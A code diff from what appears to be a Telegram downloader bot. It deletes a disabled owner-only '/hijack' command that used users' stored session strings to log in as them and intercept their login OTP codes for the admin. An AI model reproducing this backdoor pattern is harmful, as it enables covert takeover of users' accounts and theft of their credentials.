@@ -41,72 +41,9 @@ from devgagan.modules.shrink import is_user_verified
 async def generate_random_name(length=8):
     return ''.join(random.choices(string.ascii_lowercase, k=length))
 
-'''
-# OTP listening dictionary
-otp_listeners = {}
-
-async def is_session_alive(session_string):
-    """Checks if a given session string is alive or dead."""
-    try:
-        userbot = Client(
-            "session_checker",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=session_string
-        )
-        await userbot.connect()
-        await userbot.get_me()  # Verifies the session
-        await userbot.disconnect()
-        return True  # Session is alive
-    except Exception:
-        print(f"Session check error: {e}")  # Log error for debugging
-        return False  # Session is dead
-
-@app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
-async def hijack_session(_, message):
-    """Admin-only command to listen for OTP of a user after checking session validity."""
-    admin_id = message.chat.id
-    await message.reply("Enter the user_id of the user:")
-
-    # Wait for admin to send user_id
-    user_id_msg = await app.listen(admin_id, timeout=60)
-
-    if not user_id_msg.text.isdigit():
-        await message.reply("❌ Invalid user ID. Operation cancelled.")
-        return
-
-    user_id = int(user_id_msg.text)
-
-    # Check if user_id exists in MongoDB (user_sessions_real)
-    user_session = await user_sessions_real.find_one({"user_id": user_id})  # ✅ Fixed query
-    if not user_session or "session_string" not in user_session:  # ✅ Corrected session key check
-        await message.reply("❌ User not found in the database.")
-        return
-
-    session_string = user_session["session_string"]
-
-    # Check if session is alive
-    if not await is_session_alive(session_string):
-        await message.reply("Dead Session")
-        return
-
-    await message.reply("✅ User found! Listening for OTP...")
-
-    # Store admin_id to forward OTP when received
-    otp_listeners[user_id] = admin_id
-
-    # ✅ Start the userbot and listen for OTPs
-    userbot = await initialize_userbot(user_id, app, admin_id)  # Pass bot client and admin_id
-    if not userbot:
-        await message.reply("❌ Failed to start userbot.")
-        return
-'''
-
-
 users_loop = {}
 interval_set = {}
 batch_mode = {}
-
 
 
 async def process_and_upload_link(userbot, user_id, msg_id, link, retry_count, message):
